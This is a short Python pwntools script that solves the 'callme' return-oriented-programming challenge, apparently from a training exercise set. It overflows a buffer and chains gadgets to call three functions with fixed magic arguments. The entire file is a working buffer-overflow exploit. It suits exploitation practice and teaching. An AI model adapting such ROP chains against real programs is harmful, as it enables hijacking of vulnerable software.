from pwn import *

io = process("./callme")

#io = gdb.debug("./callme", 
#'''
#break *0x000000000040092d
#continue
#''')


ret = 0x00000000004006be
pop_rdi = 0x000000000040093c
call_one = 0x0000000000400720
call_two = 0x0000000000400740
call_three = 0x00000000004006f0

payload = b"a"*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call_one)
payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call_two)
payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call_three)
io.sendline(payload)
io.interactive()